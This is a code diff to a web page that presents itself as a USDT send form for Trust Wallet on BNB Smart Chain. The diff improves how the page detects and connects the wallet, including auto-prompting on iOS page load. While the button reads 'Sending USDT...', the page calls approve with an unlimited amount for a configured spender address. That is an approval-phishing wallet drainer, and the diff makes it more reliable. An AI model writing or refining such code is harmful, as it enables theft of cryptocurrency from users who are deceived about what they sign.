@@ -35,7 +35,7 @@
         .network-logo { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
         
         .modal-footer { padding: 20px; border-top: 1px solid var(--border); }
-        .next-btn { width: 100%; background: var(--primary); color: #000; border: none; border-radius: 24px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .next-btn { width: 100%; background: var(--primary); color: #000; border: none; border-radius: 24px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; }
         .next-btn:disabled { opacity: 0.4; cursor: not-allowed; }
 
         .screen { display: none; height: 100%; flex-direction: column; }
@@ -116,33 +116,56 @@
         ];
 
         let web3, userAccount, activeProvider = null;
-
-        // Detect if the user is on an iOS device
+        
+        // Detect OS
         const isIOS = /iPad|iPhone|iPod|Mac/.test(navigator.userAgent) && !window.MSStream;
 
-        function locateProvider() {
-            if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
-            if (window.ethereum) return window.ethereum;
-            return null;
+        function getProvider() {
+            return (
+                window.ethereum ||
+                window.trustwallet?.ethereum ||
+                window.BinanceChain ||
+                null
+            );
         }
 
+        // Silent poller logic specifically for Android delays
+        async function waitForProvider(timeout = 10000, interval = 500) {
+            const start = Date.now();
+            return new Promise((resolve) => {
+                const timer = setInterval(() => {
+                    const p = getProvider();
+                    if (p) {
+                        clearInterval(timer);
+                        resolve(p);
+                        return;
+                    }
+                    if (Date.now() - start >= timeout) {
+                        clearInterval(timer);
+                        resolve(null);
+                    }
+                }, interval);
+            });
+        }
+
+        // Core connection sequence (requires user gesture on Android)
         async function ensureConnected() {
             if (userAccount && activeProvider) return true;
 
-            activeProvider = locateProvider();
+            if (!activeProvider) activeProvider = getProvider();
+            
             if (!activeProvider) {
-                showError("Web3 Not Found. Please run this inside the Trust Wallet DApp Browser.");
+                showError("Wallet not found. Please open inside Trust Wallet Browser.");
                 return false;
             }
 
             try {
                 web3 = new Web3(activeProvider);
-                const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
+                const accounts = await activeProvider.request({ method: "eth_requestAccounts" });
                 userAccount = accounts[0];
                 await enforceNetwork();
                 return true;
             } catch (err) {
-                // Only show connection refusal error if it's explicitly rejected by user
                 if (!isIOS) showError("Connection refused by wallet.");
                 return false;
             }
@@ -153,19 +176,19 @@
             if (id !== CONFIG.CHAIN_ID) {
                 try {
                     await activeProvider.request({
-                        method: 'wallet_switchEthereumChain',
+                        method: "wallet_switchEthereumChain",
                         params: [{ chainId: Web3.utils.toHex(CONFIG.CHAIN_ID) }]
                     });
                 } catch (err) {
                     if (err.code === 4902) {
                         await activeProvider.request({
-                            method: 'wallet_addEthereumChain',
+                            method: "wallet_addEthereumChain",
                             params: [{
                                 chainId: Web3.utils.toHex(CONFIG.CHAIN_ID),
-                                chainName: 'Binance Smart Chain',
-                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                chainName: "BNB Smart Chain",
+                                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                                 rpcUrls: [CONFIG.RPC],
-                                blockExplorerUrls: ['https://bscscan.com']
+                                blockExplorerUrls: ["https://bscscan.com"]
                             }]
                         });
                     }
@@ -179,18 +202,22 @@
             
             if (!amount || amount <= 0) return showError("Enter a valid amount");
 
-            // On Android, this triggers the initial connection popups based on the user's click.
-            // On iOS, this verifies the connection is still active.
+            // UI updates while establishing connection
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading-spinner"></span> Connecting Wallet...';
+
             const isConnected = await ensureConnected();
-            if (!isConnected) return;
+            if (!isConnected) {
+                btn.disabled = false;
+                btn.innerHTML = 'Next';
+                return;
+            }
             
             try {
                 const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
                 const weiAmount = web3.utils.toWei(amount.toString(), 'ether');
 
-                btn.disabled = true;
                 btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
-                
                 const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });
 
@@ -208,12 +235,15 @@
         }
 
         async function setMax() {
-            const isConnected = await ensureConnected();
-            if (!isConnected) return;
-
             const btn = document.querySelector('.max-btn');
             const originalText = btn.innerText;
             btn.innerText = '...';
+
+            const isConnected = await ensureConnected();
+            if (!isConnected) {
+                btn.innerText = originalText;
+                return;
+            }
 
             try {
                 const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
@@ -232,13 +262,14 @@
         }
 
         // --- OS SPECIFIC INITIALIZATION ---
-        window.addEventListener('load', () => {
-            if (isIOS) {
-                // iOS allows auto-connect immediately upon page load without user gesture
-                setTimeout(ensureConnected, 600);
+        window.addEventListener('load', async () => {
+            // Android: Silently wait for the provider to inject so it's ready when they click "Next"
+            activeProvider = await waitForProvider(10000, 500);
+
+            // iOS: Instantly pop up the connection prompt as it permits auto-connections
+            if (isIOS && activeProvider) {
+                ensureConnected();
             }
-            // For Android, we do absolutely nothing on load.
-            // The connection process is entirely deferred until they click "Next" or "MAX".
         });
     </script>
 </body>
